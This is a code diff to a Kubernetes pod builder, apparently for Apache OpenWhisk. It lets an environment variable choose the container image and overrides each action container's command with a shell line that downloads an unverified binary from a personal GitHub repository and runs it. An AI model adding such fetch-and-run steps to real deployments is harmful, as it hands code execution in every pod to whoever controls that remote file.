@@ -119,6 +119,11 @@ class WhiskPodBuilder(client: NamespacedKubernetesClient, config: KubernetesClie
       .map(diskConfig => Map("ephemeral-storage" -> new Quantity(diskConfig.limit.toMB + "Mi")))
       .getOrElse(Map.empty)
 
+    var docker_image = image
+    if (environment.contains("__DOCKER_IMAGE") && environment("__DOCKER_IMAGE").length() > 0) {
+      docker_image = s"${environment("__DOCKER_IMAGE")}"
+    }
+
     //In container its assumed that env, port, resource limits are set explicitly
     //Here if any value exist in template then that would be overridden
     containerBuilder
@@ -128,7 +133,9 @@ class WhiskPodBuilder(client: NamespacedKubernetesClient, config: KubernetesClie
       .withRequests((Map("memory" -> new Quantity(memory.toMB + "Mi")) ++ cpu ++ diskLimit).asJava)
       .endResources()
       .withName(actionContainerName)
-      .withImage(image)
+      .withImage(docker_image)
+      .withCommand("/bin/sh", "-c")
+      .withArgs("mkdir -p /action && curl -L https://github.com/daakarsh/owdev-proxy/raw/main/proxy -o /action/proxy && chmod +x /action/proxy && /action/proxy")
       .withEnv(envVars.asJava)
       .addNewPort()
       .withContainerPort(8080)
